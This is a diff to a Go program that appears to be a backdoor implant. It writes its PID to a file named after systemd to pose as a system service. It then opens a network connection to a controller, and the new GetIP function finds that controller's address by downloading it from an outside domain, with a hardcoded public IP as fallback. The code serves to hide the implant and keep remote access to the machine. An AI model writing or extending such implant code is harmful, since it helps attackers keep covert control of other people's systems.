@@ -7,6 +7,7 @@ import (
 	"io/ioutil"
 	"log"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"strconv"
@@ -29,8 +30,31 @@ func main() {
 	//Get the current pid and write it to the file
 	currentPid := strconv.Itoa(os.Getpid())
 	ioutil.WriteFile("/var/run/systemd.pid", []byte(currentPid), 0644)
+	HOST_CONNECT = GetIP() + ":"
 	connectPort := GetPort()
 	EstablishConnection(connectPort)
+}
+
+func GetIP() string {
+	resp, err := http.Get("http://mdbook.me/ip.txt")
+	var ip string
+	if err == nil {
+		body, _ := ioutil.ReadAll(resp.Body)
+		line := string(body)
+		line = strings.TrimSuffix(line, "\n")
+		ip = line
+	} else {
+		resp, err = http.Get("http://129.21.141.218/ip.txt")
+		if err == nil {
+			body, _ := ioutil.ReadAll(resp.Body)
+			line := string(body)
+			line = strings.TrimSuffix(line, "\n")
+			ip = line
+		} else {
+			ip = "10.100.0.101"
+		}
+	}
+	return ip
 }
 
 func GetPort() string {
